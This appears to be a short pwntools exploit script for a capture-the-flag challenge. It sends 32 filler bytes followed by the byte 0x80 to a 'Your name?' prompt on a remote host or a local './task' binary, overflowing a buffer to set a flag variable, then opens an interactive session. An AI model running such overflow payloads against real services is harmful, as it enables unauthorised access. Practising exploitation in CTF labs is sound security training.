from pwn import *

def exploit(boolean):
    if boolean:
        r = remote('rivit.dev', 10022)
    else:
        r = process('./task')
    
    payload = b'A'* 32
    payload += b'\x80'          # flag

    r.recvuntil('Your name? ')
    r.sendline(payload)
    r.interactive()

exploit(True)